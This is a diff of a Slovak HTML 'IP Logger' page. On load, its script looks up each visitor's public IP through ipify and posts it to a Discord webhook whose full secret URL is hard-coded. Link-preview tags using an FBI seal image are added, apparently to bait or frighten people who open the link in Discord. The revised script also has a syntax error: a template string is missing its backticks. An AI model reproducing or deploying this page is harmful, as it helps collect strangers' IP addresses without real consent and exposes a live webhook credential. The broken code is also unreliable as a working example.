@@ -1,32 +1,54 @@
+<!DOCTYPE html>
+<html lang="sk">
 <head>
   <meta charset="UTF-8" />
-  <title>IP Logger with webhook</title>
+  <title>IP Logger s webhookom</title>
+
+  <!-- Open Graph meta tagy pre pekný náhľad v Discord -->
+  <meta property="og:title" content="Super IP Logger stránka" />
+  <meta property="og:description" content="Táto stránka zaznamená tvoju IP a pošle ju na webhook." />
   <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
   <meta property="og:url" content="https://kokotzkanala.github.io/TBO-2.0-Ui/" />
   <meta property="og:type" content="website" />
+
+  <!-- Twitter card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Super IP Logger stránka" />
+  <meta name="twitter:description" content="Táto stránka zaznamená tvoju IP a pošle ju na webhook." />
+  <meta name="twitter:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
 </head>
 <body>
   <h1>IP Logger</h1>
   <script>
-    (() => {
-      const w = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
-      fetch("https://api.ipify.org?format=json")
-        .then(r => r.json())
-        .then(d => {
-          const i = d.ip;
-          console.log("Visitor IP:", i);
-          fetch(w, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: `New visitor with recorded IP: ${i}` }),
-          })
-            .then(res => {
-              if (res.ok) console.log("IP sent to webhook");
-              else console.error("Error sending to webhook");
-            })
-            .catch(console.error);
+    const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        console.log("IP návštevníka:", ip);
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: Nový návštevník so záznamom IP: ${ip}
+          }),
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("IP poslaná na webhook");
+          } else {
+            console.error("Chyba pri posielaní na webhook");
+          }
         })
         .catch(console.error);
-    })();
+      })
+      .catch(console.error);
   </script>
 </body>
+</html>
+
+
